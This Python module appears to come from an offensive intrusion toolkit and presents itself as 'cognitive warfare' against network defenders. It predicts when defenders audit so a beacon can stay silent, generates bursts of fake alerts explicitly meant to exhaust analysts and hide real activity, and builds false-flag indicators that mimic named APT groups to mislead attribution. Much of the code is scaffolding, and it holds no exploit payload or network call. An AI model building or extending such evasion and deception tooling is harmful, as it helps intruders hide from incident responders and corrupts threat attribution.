"""
Cognitive Warfare Module - Defender behavior prediction, false alert injection, and cognitive dissonance induction.

This module provides cognitive domain warfare capabilities including:
    1. Defender behavior modeling and prediction
    2. False alert injection for resource exhaustion
    3. Cognitive dissonance induction for misattribution

Core capabilities:
    - Defender activity pattern analysis
    - Risk period prediction and beacon silence scheduling
    - False positive alert generation
    - TTP mimicry for threat actor misattribution
    - Alert noise ratio optimization

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import math
import os
import random
import time
from collections import defaultdict
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class DefenderActivityType(str, Enum):
    """Types of defender activities."""

    LOG_REVIEW = "log_review"
    INCIDENT_RESPONSE = "incident_response"
    SECURITY_AUDIT = "security_audit"
    PATCH_DEPLOYMENT = "patch_deployment"
    THREAT_HUNTING = "threat_hunting"
    ALERT_TRIAGE = "alert_triage"
    FORENSIC_ANALYSIS = "forensic_analysis"


class AlertSeverity(str, Enum):
    """Alert severity levels."""

    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


class APTOrganization(str, Enum):
    """Known APT organizations for TTP mimicry."""

    APT28 = "apt28_fancy_bear"
    APT29 = "apt29_cozy_bear"
    APT41 = "apt41_double_dragon"
    LAZARUS = "lazarus_group"
    EQUATION = "equation_group"
    SANDWORM = "sandworm_team"


class CognitiveState(str, Enum):
    """Cognitive state of defenders."""

    ALERT = "alert"
    FATIGUED = "fatigued"
    CONFUSED = "confused"
    OVERWHELMED = "overwhelmed"
    NORMAL = "normal"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class DefenderActivity:
    """Recorded defender activity.

    Attributes:
        activity_type: Type of activity
        timestamp: Activity timestamp
        duration_seconds: Activity duration
        intensity: Activity intensity (0-1)
        source: Activity source
        details: Additional details
    """

    activity_type: DefenderActivityType = DefenderActivityType.LOG_REVIEW
    timestamp: float = 0.0
    duration_seconds: float = 0.0
    intensity: float = 0.0
    source: str = ""
    details: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "activity_type": self.activity_type.value,
            "timestamp": self.timestamp,
            "duration_seconds": self.duration_seconds,
            "intensity": self.intensity,
        }


@dataclass
class DefenderProfile:
    """Profile of defender behavior patterns.

    Attributes:
        profile_id: Profile identifier
        organization: Target organization
        response_time_avg: Average response time
        audit_frequency: Audit frequency per week
        active_hours: Most active hours
        fatigue_threshold: Alert fatigue threshold
        escalation_pattern: Escalation pattern
        last_activity: Last recorded activity
    """

    profile_id: str = ""
    organization: str = ""
    response_time_avg: float = 3600.0
    audit_frequency: float = 2.0
    active_hours: List[int] = field(default_factory=lambda: list(range(9, 18)))
    fatigue_threshold: int = 50
    escalation_pattern: Dict[str, float] = field(default_factory=dict)
    last_activity: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "profile_id": self.profile_id,
            "organization": self.organization,
            "response_time_avg": self.response_time_avg,
            "audit_frequency": self.audit_frequency,
            "active_hours": self.active_hours,
        }


@dataclass
class RiskPrediction:
    """Risk period prediction.

    Attributes:
        prediction_time: When prediction was made
        risk_periods: List of high-risk time periods
        safe_periods: List of safe time periods
        confidence: Prediction confidence (0-1)
        next_audit_predicted: Next predicted audit time
        recommended_action: Recommended beacon action
    """

    prediction_time: float = 0.0
    risk_periods: List[Tuple[float, float]] = field(default_factory=list)
    safe_periods: List[Tuple[float, float]] = field(default_factory=list)
    confidence: float = 0.0
    next_audit_predicted: float = 0.0
    recommended_action: str = "normal"

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "prediction_time": self.prediction_time,
            "risk_period_count": len(self.risk_periods),
            "safe_period_count": len(self.safe_periods),
            "confidence": self.confidence,
            "recommended_action": self.recommended_action,
        }


@dataclass
class FalseAlert:
    """Generated false alert.

    Attributes:
        alert_type: Type of alert
        severity: Alert severity
        source_ip: Fake source IP
        target_ip: Target IP
        timestamp: Alert timestamp
        description: Alert description
        indicators: Fake indicators of compromise
    """

    alert_type: str = "failed_login"
    severity: AlertSeverity = AlertSeverity.LOW
    source_ip: str = ""
    target_ip: str = ""
    timestamp: float = 0.0
    description: str = ""
    indicators: Dict[str, str] = field(default_factory=dict)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "alert_type": self.alert_type,
            "severity": self.severity.value,
            "source_ip": self.source_ip,
            "timestamp": self.timestamp,
        }


@dataclass
class TTPSignature:
    """TTP signature for APT mimicry.

    Attributes:
        apt_organization: APT organization to mimic
        techniques: MITRE ATT&CK technique IDs
        tools: Tools used
        infrastructure: Infrastructure patterns
        timing: Timing patterns
        language_hints: Language hints in code
    """

    apt_organization: APTOrganization = APTOrganization.APT28
    techniques: List[str] = field(default_factory=list)
    tools: List[str] = field(default_factory=list)
    infrastructure: Dict[str, str] = field(default_factory=dict)
    timing: Dict[str, Any] = field(default_factory=dict)
    language_hints: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "apt_organization": self.apt_organization.value,
            "technique_count": len(self.techniques),
            "tool_count": len(self.tools),
        }


# =============================================================================
# Defender Behavior Predictor
# =============================================================================

class DefenderBehaviorPredictor:
    """Predicts defender behavior patterns.

    Analyzes historical defender activities to predict
    when audits, reviews, and investigations are likely.

    Attributes:
        _activities: Historical activity records
        _profiles: Defender profiles
        _prediction_model: Prediction model state
    """

    def __init__(self) -> None:
        """Initialize the DefenderBehaviorPredictor."""
        self._activities: List[DefenderActivity] = []
        self._profiles: Dict[str, DefenderProfile] = {}
        self._prediction_model: Dict[str, Any] = {}

    def add_activity(self, activity: DefenderActivity) -> None:
        """Add a defender activity record.

        Args:
            activity: Activity to add.
        """
        self._activities.append(activity)

        if activity.source not in self._profiles:
            self._profiles[activity.source] = DefenderProfile(
                profile_id=hashlib.md5(
                    f"profile_{activity.source}_{time.time()}".encode()
                ).hexdigest()[:12],
                organization=activity.source,
            )

    def analyze_patterns(self) -> Dict[str, Any]:
        """Analyze defender activity patterns.

        Returns:
            Dictionary with pattern analysis.
        """
        if not self._activities:
            return {}

        hourly_distribution: Dict[int, int] = defaultdict(int)
        daily_distribution: Dict[int, int] = defaultdict(int)
        activity_type_counts: Dict[str, int] = defaultdict(int)

        for activity in self._activities:
            dt = datetime.fromtimestamp(activity.timestamp)
            hourly_distribution[dt.hour] += 1
            daily_distribution[dt.weekday()] += 1
            activity_type_counts[activity.activity_type.value] += 1

        peak_hours = sorted(
            hourly_distribution.items(), key=lambda x: x[1], reverse=True,
        )[:5]

        return {
            "total_activities": len(self._activities),
            "hourly_distribution": dict(hourly_distribution),
            "daily_distribution": dict(daily_distribution),
            "activity_type_counts": dict(activity_type_counts),
            "peak_hours": peak_hours,
        }

    def predict_risk_periods(
        self,
        horizon_hours: int = 24,
    ) -> RiskPrediction:
        """Predict high-risk periods.

        Args:
            horizon_hours: Prediction horizon in hours.

        Returns:
            RiskPrediction with risk and safe periods.
        """
        patterns = self.analyze_patterns()
        now = time.time()

        risk_periods: List[Tuple[float, float]] = []
        safe_periods: List[Tuple[float, float]] = []

        peak_hours = [h for h, _ in patterns.get("peak_hours", [])]

        for hour_offset in range(horizon_hours):
            future_time = now + (hour_offset * 3600)
            future_dt = datetime.fromtimestamp(future_time)
            hour = future_dt.hour
            weekday = future_dt.weekday()

            is_peak = hour in peak_hours
            is_workday = weekday < 5
            is_work_hours = 9 <= hour <= 17

            risk_score = 0.0
            if is_peak:
                risk_score += 0.4
            if is_workday:
                risk_score += 0.2
            if is_work_hours:
                risk_score += 0.3

            period_start = future_time
            period_end = future_time + 3600

            if risk_score >= 0.5:
                risk_periods.append((period_start, period_end))
            else:
                safe_periods.append((period_start, period_end))

        confidence = min(len(self._activities) / 100, 1.0)

        recommended = "silent" if risk_periods else "normal"

        next_audit = 0.0
        if risk_periods:
            next_audit = risk_periods[0][0]

        return RiskPrediction(
            prediction_time=now,
            risk_periods=risk_periods,
            safe_periods=safe_periods,
            confidence=confidence,
            next_audit_predicted=next_audit,
            recommended_action=recommended,
        )

    def get_defender_state(self) -> CognitiveState:
        """Get current defender cognitive state.

        Returns:
            Current cognitive state.
        """
        if not self._activities:
            return CognitiveState.NORMAL

        recent_cutoff = time.time() - (24 * 3600)
        recent_activities = [
            a for a in self._activities if a.timestamp > recent_cutoff
        ]

        total_intensity = sum(a.intensity for a in recent_activities)
        activity_count = len(recent_activities)

        if activity_count > 50 or total_intensity > 40:
            return CognitiveState.OVERWHELMED
        elif activity_count > 30 or total_intensity > 25:
            return CognitiveState.FATIGUED
        elif activity_count > 10:
            return CognitiveState.ALERT
        else:
            return CognitiveState.NORMAL

    def get_status(self) -> Dict[str, Any]:
        """Get predictor status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "activity_count": len(self._activities),
            "profile_count": len(self._profiles),
            "defender_state": self.get_defender_state().value,
        }


# =============================================================================
# False Alert Generator
# =============================================================================

class FalseAlertGenerator:
    """Generates false security alerts.

    Creates realistic-looking low-severity alerts to
    exhaust defender resources and hide real activity.

    Attributes:
        _generated_count: Total alerts generated
        _alert_templates: Alert templates
        _target_network: Target network info
    """

    ALERT_TEMPLATES: Dict[str, Dict[str, Any]] = {
        "failed_login": {
            "type": "failed_login",
            "severity": AlertSeverity.LOW,
            "description": "Multiple failed login attempts detected",
            "indicators": {"event_id": "4625", "logon_type": "3"},
        },
        "port_scan": {
            "type": "port_scan",
            "severity": AlertSeverity.LOW,
            "description": "Potential port scan detected",
            "indicators": {"ports_scanned": "1-1024", "protocol": "TCP"},
        },
        "dns_query": {
            "type": "suspicious_dns",
            "severity": AlertSeverity.LOW,
            "description": "Unusual DNS query pattern",
            "indicators": {"query_type": "TXT", "domain_length": "long"},
        },
        "file_access": {
            "type": "suspicious_file_access",
            "severity": AlertSeverity.LOW,
            "description": "Access to sensitive file path",
            "indicators": {"file_path": "/etc/passwd", "access_type": "read"},
        },
        "process_creation": {
            "type": "suspicious_process",
            "severity": AlertSeverity.LOW,
            "description": "Unusual process creation",
            "indicators": {"process": "cmd.exe", "parent": "explorer.exe"},
        },
    }

    def __init__(self, target_network: str = "") -> None:
        """Initialize the FalseAlertGenerator.

        Args:
            target_network: Target network identifier.
        """
        self._generated_count = 0
        self._alert_templates = self.ALERT_TEMPLATES.copy()
        self._target_network = target_network

    def generate_alert(
        self,
        alert_type: Optional[str] = None,
        source_ip: Optional[str] = None,
        target_ip: Optional[str] = None,
    ) -> FalseAlert:
        """Generate a false alert.

        Args:
            alert_type: Specific alert type.
            source_ip: Source IP address.
            target_ip: Target IP address.

        Returns:
            Generated FalseAlert.
        """
        if alert_type and alert_type in self._alert_templates:
            template = self._alert_templates[alert_type]
        else:
            template = random.choice(list(self._alert_templates.values()))

        if not source_ip:
            source_ip = self._generate_random_ip()

        if not target_ip:
            target_ip = self._generate_random_ip()

        alert = FalseAlert(
            alert_type=template["type"],
            severity=template["severity"],
            source_ip=source_ip,
            target_ip=target_ip,
            timestamp=time.time(),
            description=template["description"],
            indicators=template["indicators"].copy(),
        )

        self._generated_count += 1
        return alert

    def generate_alert_burst(
        self,
        count: int = 20,
        duration_minutes: int = 30,
    ) -> List[FalseAlert]:
        """Generate a burst of false alerts.

        Args:
            count: Number of alerts.
            duration_minutes: Time span for alerts.

        Returns:
            List of generated alerts.
        """
        alerts: List[FalseAlert] = []
        interval = (duration_minutes * 60) / count

        for i in range(count):
            alert = self.generate_alert()
            alert.timestamp = time.time() - (interval * (count - i))
            alerts.append(alert)

        return alerts

    def _generate_random_ip(self) -> str:
        """Generate a random IP address.

        Returns:
            Random IP string.
        """
        return f"{random.randint(10, 192)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def get_status(self) -> Dict[str, Any]:
        """Get generator status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "generated_count": self._generated_count,
            "template_count": len(self._alert_templates),
        }


# =============================================================================
# Cognitive Dissonance Inducer
# =============================================================================

class CognitiveDissonanceInducer:
    """Induces cognitive dissonance in defenders.

    Creates activity patterns that mimic known APT organizations
    to cause misattribution and confusion.

    Attributes:
        _active_mimicry: Currently active APT mimicry
        _ttp_signatures: TTP signature database
        _injection_count: Injection count
    """

    APT_TTP_DATABASE: Dict[APTOrganization, TTPSignature] = {
        APTOrganization.APT28: TTPSignature(
            apt_organization=APTOrganization.APT28,
            techniques=["T1566.001", "T1059.003", "T1070.001"],
            tools=["X-Agent", "CHOPSTICK", "JHUHUGIT"],
            infrastructure={"c2_pattern": "dga_domains", "registration": "russian"},
            timing={"active_hours": [9, 17], "timezone": "UTC+3"},
            language_hints=["russian", "cyrillic_comments"],
        ),
        APTOrganization.APT29: TTPSignature(
            apt_organization=APTOrganization.APT29,
            techniques=["T1190", "T1059.001", "T1071.001"],
            tools=["WellMess", "SoreFang", "PowerShell"],
            infrastructure={"c2_pattern": "cloud_services", "registration": "diplomatic"},
            timing={"active_hours": [8, 18], "timezone": "UTC+3"},
            language_hints=["russian", "diplomatic_cover"],
        ),
        APTOrganization.APT41: TTPSignature(
            apt_organization=APTOrganization.APT41,
            techniques=["T1190", "T1059.003", "T1486"],
            tools=["POISONPLUG", "HIGHNOON", "ShadowPad"],
            infrastructure={"c2_pattern": "legitimate_compromised", "registration": "chinese"},
            timing={"active_hours": [1, 5], "timezone": "UTC+8"},
            language_hints=["chinese", "simplified_comments"],
        ),
        APTOrganization.LAZARUS: TTPSignature(
            apt_organization=APTOrganization.LAZARUS,
            techniques=["T1486", "T1566.001", "T1059.003"],
            tools=["Manuscrypt", "AppleJeus", "HOPLIGHT"],
            infrastructure={"c2_pattern": "cryptocurrency_related", "registration": "north_korean"},
            timing={"active_hours": [0, 6], "timezone": "UTC+9"},
            language_hints=["korean", "banking_focus"],
        ),
        APTOrganization.SANDWORM: TTPSignature(
            apt_organization=APTOrganization.SANDWORM,
            techniques=["T1495", "T1498", "T1059.001"],
            tools=["BlackEnergy", "NotPetya", "GreyEnergy"],
            infrastructure={"c2_pattern": "critical_infrastructure", "registration": "russian"},
            timing={"active_hours": [2, 6], "timezone": "UTC+3"},
            language_hints=["russian", "ukrainian_focus"],
        ),
        APTOrganization.EQUATION: TTPSignature(
            apt_organization=APTOrganization.EQUATION,
            techniques=["T1055", "T1056", "T1068"],
            tools=["Equation Drug", "DoubleFantasy", "TripleFantasy"],
            infrastructure={"c2_pattern": "state_level", "registration": "five_eyes"},
            timing={"active_hours": [0, 24], "timezone": "UTC+0"},
            language_hints=["english", "advanced_persistence"],
        ),
    }

    def __init__(self) -> None:
        """Initialize the CognitiveDissonanceInducer."""
        self._active_mimicry: Optional[TTPSignature] = None
        self._ttp_signatures = self.APT_TTP_DATABASE.copy()
        self._injection_count = 0

    def select_mimicry_target(
        self,
        organization: Optional[APTOrganization] = None,
    ) -> TTPSignature:
        """Select an APT organization to mimic.

        Args:
            organization: Specific organization.

        Returns:
            Selected TTPSignature.
        """
        if organization:
            self._active_mimicry = self._ttp_signatures.get(
                organization, self.APT_TTP_DATABASE[APTOrganization.APT28],
            )
        else:
            self._active_mimicry = random.choice(
                list(self._ttp_signatures.values()),
            )

        return self._active_mimicry

    def generate_misattribution_indicators(self) -> Dict[str, Any]:
        """Generate indicators pointing to wrong APT.

        Returns:
            Dictionary with misattribution indicators.
        """
        if not self._active_mimicry:
            self.select_mimicry_target()

        indicators: Dict[str, Any] = {
            "techniques_used": self._active_mimicry.techniques,
            "tools_dropped": self._active_mimicry.tools[:2],
            "infrastructure_hints": self._active_mimicry.infrastructure,
            "timing_pattern": self._active_mimicry.timing,
            "language_artifacts": self._active_mimicry.language_hints,
        }

        self._injection_count += 1
        return indicators

    def inject_false_flag(
        self,
        target_path: str = "",
        flag_type: str = "string",
    ) -> bool:
        """Inject false flag indicator.

        Args:
            target_path: Path to inject flag.
            flag_type: Type of flag.

        Returns:
            True if injection succeeded.
        """
        if not self._active_mimicry:
            return False

        logger.info(
            f"False flag injection: {flag_type} at {target_path} "
            f"mimicking {self._active_mimicry.apt_organization.value}"
        )

        self._injection_count += 1
        return True

    def create_conflicting_evidence(self) -> List[Dict[str, Any]]:
        """Create conflicting evidence for multiple APTs.

        Returns:
            List of conflicting evidence items.
        """
        evidence: List[Dict[str, Any]] = []

        orgs = random.sample(
            list(APTOrganization), min(3, len(APTOrganization)),
        )

        for org in orgs:
            signature = self._ttp_signatures[org]
            evidence.append({
                "indicator_type": random.choice(["technique", "tool", "infrastructure"]),
                "points_to": org.value,
                "confidence": random.uniform(0.3, 0.7),
                "details": signature.to_dict(),
            })

        return evidence

    def get_status(self) -> Dict[str, Any]:
        """Get inducer status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "active_mimicry": (
                self._active_mimicry.apt_organization.value
                if self._active_mimicry else None
            ),
            "injection_count": self._injection_count,
        }


# =============================================================================
# Cognitive Warfare Manager
# =============================================================================

class CognitiveWarfareManager:
    """Main cognitive warfare coordination engine.

    Integrates defender prediction, false alert generation,
    and cognitive dissonance induction.

    Attributes:
        _predictor: Defender behavior predictor
        _alert_generator: False alert generator
        _dissonance_inducer: Cognitive dissonance inducer
        _active: Whether warfare is active
    """

    def __init__(self, target_network: str = "") -> None:
        """Initialize the CognitiveWarfareManager.

        Args:
            target_network: Target network identifier.
        """
        self._predictor = DefenderBehaviorPredictor()
        self._alert_generator = FalseAlertGenerator(target_network)
        self._dissonance_inducer = CognitiveDissonanceInducer()
        self._active = False

    async def start(self) -> bool:
        """Start cognitive warfare operations.

        Returns:
            True if started successfully.
        """
        self._active = True
        logger.info("Cognitive warfare operations started")
        return True

    async def stop(self) -> None:
        """Stop cognitive warfare operations."""
        self._active = False
        logger.info("Cognitive warfare operations stopped")

    def record_defender_activity(self, activity: DefenderActivity) -> None:
        """Record defender activity.

        Args:
            activity: Activity to record.
        """
        self._predictor.add_activity(activity)

    def get_risk_prediction(
        self, horizon_hours: int = 24,
    ) -> RiskPrediction:
        """Get risk period prediction.

        Args:
            horizon_hours: Prediction horizon.

        Returns:
            RiskPrediction.
        """
        return self._predictor.predict_risk_periods(horizon_hours)

    def should_beacon_be_silent(self) -> bool:
        """Check if beacon should be silent.

        Returns:
            True if beacon should be silent.
        """
        prediction = self.get_risk_prediction()
        now = time.time()

        for start, end in prediction.risk_periods:
            if start <= now <= end:
                return True

        return False

    def generate_false_alerts(
        self, count: int = 20, duration_minutes: int = 30,
    ) -> List[FalseAlert]:
        """Generate false alerts.

        Args:
            count: Number of alerts.
            duration_minutes: Duration span.

        Returns:
            List of false alerts.
        """
        if not self._active:
            return []

        return self._alert_generator.generate_alert_burst(count, duration_minutes)

    def induce_misattribution(
        self, target_apt: Optional[APTOrganization] = None,
    ) -> Dict[str, Any]:
        """Induce misattribution.

        Args:
            target_apt: APT to mimic.

        Returns:
            Misattribution indicators.
        """
        if not self._active:
            return {}

        self._dissonance_inducer.select_mimicry_target(target_apt)
        return self._dissonance_inducer.generate_misattribution_indicators()

    def get_status(self) -> Dict[str, Any]:
        """Get cognitive warfare status.

        Returns:
            Dictionary with status summary.
        """
        return {
            "active": self._active,
            "predictor": self._predictor.get_status(),
            "alert_generator": self._alert_generator.get_status(),
            "dissonance_inducer": self._dissonance_inducer.get_status(),
        }


# =============================================================================
# Global Singleton
# =============================================================================

_cognitive_warfare_manager: Optional[CognitiveWarfareManager] = None


def get_cognitive_warfare_manager(
    target_network: str = "",
) -> CognitiveWarfareManager:
    """Get the global CognitiveWarfareManager singleton.

    Args:
        target_network: Target network identifier.

    Returns:
        Singleton CognitiveWarfareManager instance.
    """
    global _cognitive_warfare_manager
    if _cognitive_warfare_manager is None:
        _cognitive_warfare_manager = CognitiveWarfareManager(target_network)
    return _cognitive_warfare_manager


__all__ = [
    "CognitiveWarfareManager",
    "DefenderBehaviorPredictor",
    "FalseAlertGenerator",
    "CognitiveDissonanceInducer",
    "DefenderActivity",
    "DefenderProfile",
    "RiskPrediction",
    "FalseAlert",
    "TTPSignature",
    "DefenderActivityType",
    "AlertSeverity",
    "APTOrganization",
    "CognitiveState",
    "get_cognitive_warfare_manager",
]
